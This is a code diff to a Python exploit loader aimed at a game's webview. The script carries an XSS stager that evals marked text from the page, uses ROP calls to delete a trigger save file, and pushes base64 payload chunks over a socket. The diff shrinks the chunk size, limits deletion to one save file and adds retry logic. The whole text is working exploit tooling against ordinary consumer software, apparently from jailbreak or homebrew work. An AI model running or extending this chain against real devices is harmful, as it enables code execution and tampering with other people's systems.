@@ -23,7 +23,7 @@ or a previously installed trigger).
 import base64, io, json, os, shutil, socket, subprocess, sys, tempfile, time
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-CHUNK = 400000   # b64 chars per loader connection (< 500KB payload limit)
+CHUNK = 131072    # smaller chunks are more reliable on the game webview
 
 STAGER = ('<img src=x onerror="eval(document.body.textContent'
           ".match(/XSSP:[0-9]+:[0-9a-f]+/g)"
@@ -124,6 +124,7 @@ if (sub) {
     for (let j = 0; j < sub.length; j++) {
         if (sub[j].type !== 1) continue;
         const nm = sub[j].name;
+        if (nm !== "XSTRIG.Civ7Save") continue;
         sfx_writePath(text_encode("save:/saves/Single/" + nm));
         call_rop(F_DeleteFile, sfx_pb);
     }
@@ -185,7 +186,7 @@ await log(e.stack);
 """
 
 
-def send(host, port, code, timeout=300):
+def send(host, port, code, timeout=120):
     s = socket.create_connection((host, port), timeout=8)
     s.sendall(code.encode())
     s.shutdown(socket.SHUT_WR)
@@ -246,11 +247,23 @@ def main():
         t0 = time.time()
         for i in range(n):
             part = tpl_b64[i * CHUNK:(i + 1) * CHUNK]
-            out = send(host, port,
-                       "(window.__tpl=window.__tpl||[]).push('%s');"
-                       "'chunk %d/%d'" % (part, i + 1, n))
-            if "Executed" not in out:
-                print("chunk %d/%d FAILED: %s" % (i + 1, n, out.strip()[:200]))
+            ok = False
+            out = ""
+            for attempt in range(1, 4):
+                print("chunk %d/%d attempt %d ..." % (i + 1, n, attempt), flush=True)
+                try:
+                    out = send(host, port,
+                               "(window.__tpl=window.__tpl||[]).push('%s');"
+                               "'chunk %d/%d'" % (part, i + 1, n))
+                except Exception as e:
+                    out = "EXCEPTION: " + str(e)
+                if "Executed" in out:
+                    ok = True
+                    break
+                print("chunk %d/%d FAILED: %s" % (i + 1, n, out.strip()[:200]), flush=True)
+                time.sleep(0.3)
+            if not ok:
+                print("chunk %d/%d gave up" % (i + 1, n), flush=True)
         print("template: %d chunks, %.0fs" % (n, time.time() - t0))
         out = send(host, port, apply_js)
         print(out)
